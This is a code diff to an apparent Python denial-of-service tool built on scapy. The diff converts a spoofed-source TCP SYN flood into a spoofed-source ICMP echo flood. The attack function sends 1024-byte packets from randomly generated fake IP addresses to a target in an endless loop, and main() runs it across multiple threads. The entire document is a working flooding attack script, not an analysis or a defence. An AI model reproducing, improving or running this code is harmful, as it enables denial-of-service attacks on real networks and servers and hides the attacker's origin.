@@ -5,14 +5,14 @@ from scapy.all import *
 
 
         
-def attack(target, dest_port, source_port=7000):
+def attack(target):
     try:
         while True:
             s_addr = fake_ip_gen()   
             ip = IP(src= s_addr, dst= target)
-            tcp = TCP(sport =source_port, dport=dest_port, flags="S")
+            icmp = ICMP(type=8, code=0)
             flood_data = Raw(b"A"*1024)
-            pkt =ip / tcp / flood_data
+            pkt =ip / icmp / flood_data
             send(pkt)
             
     except Exception as e:
@@ -21,13 +21,13 @@ def attack(target, dest_port, source_port=7000):
 
  
 def main():
-    target_ip, dest_port, source_port, num_threads = args_handler() 
+    target_ip, num_threads = args_handler() 
     
     for i in range(num_threads):
-        thread = threading.Thread(target=attack, args=(target_ip, dest_port, source_port))
+        thread = threading.Thread(target=attack, args=(target_ip,))
         thread.start()
 
   
 if __name__ == '__main__':
     main()
-    
+ 
